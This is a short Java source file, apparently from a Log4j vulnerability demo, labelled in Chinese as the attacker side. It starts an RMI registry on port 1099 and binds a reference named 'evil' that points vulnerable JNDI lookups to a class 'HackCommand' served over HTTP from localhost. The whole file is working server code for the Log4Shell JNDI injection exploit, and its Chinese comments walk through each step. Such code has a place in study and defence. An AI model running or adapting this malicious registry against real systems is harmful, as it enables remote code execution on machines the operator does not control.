package com.zjm.log.log4jbug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

/**
 * 攻击方
 */
public class RmiServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

        // className - 远程加载时所使用的类名
        // classFactory - 加载的class中需要实例化类的名称
        // classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议
        Reference reference=new Reference("com.zjm.log.log4jbug.HackCommand","com.zjm.log.log4jbug.HackCommand","http://127.0.0.1:8080/");

        // 因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类，
        // 故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);

        // 绑定RMI服务到 1099端口 Object  提供恶意类的RMI服务
        LocateRegistry.createRegistry(1099).bind("evil",referenceWrapper);
    }
}
